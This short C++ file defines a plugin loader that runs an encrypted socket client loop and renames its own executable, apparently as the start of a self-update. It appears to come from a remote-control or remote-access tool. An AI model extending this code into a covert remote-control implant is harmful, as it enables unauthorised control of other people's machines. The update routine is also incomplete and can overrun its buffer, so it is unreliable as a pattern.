

#include "PluginLoader.h"
#include <stdio.h>

PluginLoader Loader;

PluginLoader::PluginLoader(){

};

uint PluginLoader::run(SOCKET hConexion,HCRYPTKEY hKey,LoaderFunTable& lFunc){
	//rpp conexion(hConexion,hKey);
	MessageBoxA(0, "PluginLoader::run", "DLL Message", MB_OK | MB_ICONINFORMATION);
	RPEP client(hConexion,hKey);
	return client.clientLoop();
};

bool PluginLoader::updateServer(DArray& newServer){
	char FileName[1024];
	char FileNameNew[1024];
	long FilenameSize;
	FilenameSize = GetModuleFileName(0,FileName,sizeof(FileName)-1);

	strcpy(FileNameNew,FileName);
	FileNameNew[FilenameSize] = '_';
	FileNameNew[FilenameSize+1] = 0;

	MoveFile(FileName,FileNameNew);

	return true;
}
